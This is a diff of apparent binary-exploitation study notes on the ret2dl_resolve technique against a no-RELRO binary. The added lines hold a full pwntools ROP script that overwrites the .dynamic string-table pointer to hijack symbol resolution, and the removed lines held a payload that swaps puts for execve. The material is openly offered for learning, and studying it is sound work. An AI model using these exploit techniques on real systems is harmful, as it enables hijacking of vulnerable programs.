@@ -1103,12 +1103,27 @@ in the String table we look at ofset 10h and find the string puts
 
 Prerequisites
 1. IP controll
-2. ability to write to memory #we use read() #if we cant find a pop rdx we could ret2csu before 
-		#or use mov [reg],reg and corespoding pop gadgets to write our fake frame but this will increase the payload size!!
+2. ability to write to memory we use read() and a mov [reg],reg and corespoding pop gadgets to write our fake frame/dynstr entry.  (if we cant find a pop rdx we could ret2csu before)
 
-in the .dynamic section there is a pointer to the String table .dynstr if RELRO is off this section is actually writeable we can change the pointer to.
-if we cange d_val to a section in the .bss we can basically write our own String table there and simply could replace puts with execve.
-
+in the .dynamic section there is a pointer to the String table .dynstr if RELRO is off this section is actually writeable and we can change the pointer to .dynstr
+		
+```
+gef➤  vmmap 0x4031d0     			#.dynamic start here
+[ Legend:  Code | Heap | Stack ]
+Start              End                Offset             Perm Path
+0x0000000000403000 0x0000000000404000 0x0000000000002000 rw- /home/bex/Desktop/re2dl/resolve_no_relro		
+```
+0x4031d0 + 0x88 = 0x403258
+<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/nRELROdynamicSection_no_relro.png">
+		
+if we cange d_val to point to a section in the .bss we can basically copy the .dynsym and replace an entry with our own String.
+or just place our fake String at the right offset from the start of our fake_dynstr we use setbuf to overwrite it with puts.
+		
+the offset is 0x1d 0x400455 - 0x400438 = 0x1d
+		
+<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/dynstr_new.png">
+		
+we place the fake_frame @ 0x403580 and the fake setbuf entry @0x403580+0x1d = 0x40359d
 
 ```
  ___________________      ___________________ 
@@ -1132,18 +1147,117 @@ if we cange d_val to a section in the .bss we can basically write our own String
 		|___________________|    |___________________|
 
 ```
-<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/nRELROdynamicSection.png">		
-<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/dynstr.png">
 		
-fake .dynstr in .bss (d_val points to the first `\x00`)		
+
+		
+		
 ```
-payload = b'\x00'
-payload += b'libc.so.6\x00'		
-payload += b'gets\x00'
-payload += b'execve\x00'		#puts was here before
-payload += b'__libc_start_main\x00'
-payload += b'GLIBC_2.2.5\x00'
-payload += b'__gmon_start__\x00'
+#!/usr/bin/env python3
+from pwn import *
+
+
+fname = 'resolve_no_relro'
+ip = '0.0.0.0'
+port = 1337 #change this
+context.binary = elf = ELF('resolve_no_relro')
+
+
+
+
+LOCAL = True
+
+if LOCAL:
+    r = process(fname,aslr=True)
+
+    gdbscript="""
+    b *main
+    b *0x00000000004011c8
+    b *0x00000000004011c0
+    b *0x401044
+
+    """
+    #set follow-fork-mode
+
+    attach('resolve_no_relro',gdbscript=gdbscript)
+else:
+    r = remote(ip, port)
+
+s = lambda x : r.send(x)
+rl = lambda : r.recvline()
+rlb = lambda : r.recvlineb()
+sl = lambda x : r.sendline(x)
+ru = lambda x :r.recvuntil(x)
+rcb = lambda x :r.recvb(x)
+sla = lambda x,y : r.sendlineafter(x,y)
+inter = lambda : r.interactive()
+
+
+def pwn():
+
+
+	pop_rdi		= 0x401263
+	pop_rsi_r15	= 0x401261
+	pop_rdx		= 0x4011d1
+	read = elf.plt['read']
+	mov_p_rdi_rdx = 0x4011d4
+
+	dl_resolve_setbuf = 0x401044 			#push index (1) + elf_info # the normal resolve for setbuf
+
+	dynaminc = 0x4031d0
+	dynaminc_DT_STRTAB = dynaminc + 0x88    #here we have to place our pointer to fake_dynstr
+
+
+
+	fake_frame_addr = 0x403580 						#here our fake frame starts 
+	fake_dynstr_entry_addr = fake_frame_addr + 0x1d #0x1d cause the st_name for setbuf is 0x1d so the resolve() looks at #0x40359d for the string
+
+
+	#fake dysntr entry #we dont need to put the whole frame into memory only the right dynstr entry at the right offset from fake_frame start addr 
+	fake_dynstr_entry = b'puts\x00'						
+
+	len_fake_dynstr_entry = len(fake_dynstr_entry)
+
+
+	payload = b''
+	payload += b'A'*24				    				#pad
+
+	#write our fake_frame (fake_dynstr) into .bss
+	payload += p64(pop_rdi)
+	payload += p64(0x00)			    					#read from stdin
+	payload += p64(pop_rsi_r15)
+	payload += p64(fake_dynstr_entry_addr)
+	payload += p64(0x00)			    					#junk r15
+	payload += p64(pop_rdx)
+	payload += p64(len_fake_dynstr_entry)
+	payload += p64(read)
+
+	#overwrite pointer in .dynamic to .dynstr at offset 0x403258 - 0x4031d0 = 0x88
+	payload += p64(pop_rdi)				
+	payload += p64(dynaminc_DT_STRTAB)						#where in the .dynamic section on the pointer to .dynstr
+	payload += p64(pop_rdx)				
+	payload += p64(fake_frame_addr)							#what the pointer to our fake dynstr
+	payload += p64(mov_p_rdi_rdx)
+
+
+	#set args for function we want to resolve
+	payload += p64(pop_rdi)
+	payload += p64(0x400000)							#argument for the fake function we will resolve
+	payload += p64(dl_resolve_setbuf)
+	payload += p64(0x11111111111111)*4						#we crash here 
+
+	input('press enter to send Payload')
+	s(payload)
+	input('press enter to write frame')
+	s(fake_dynstr_entry)
+
+	inter()
+
+if __name__ == '__main__':
+    pwn()
+
+
+
+		
 ```
 
 </div>
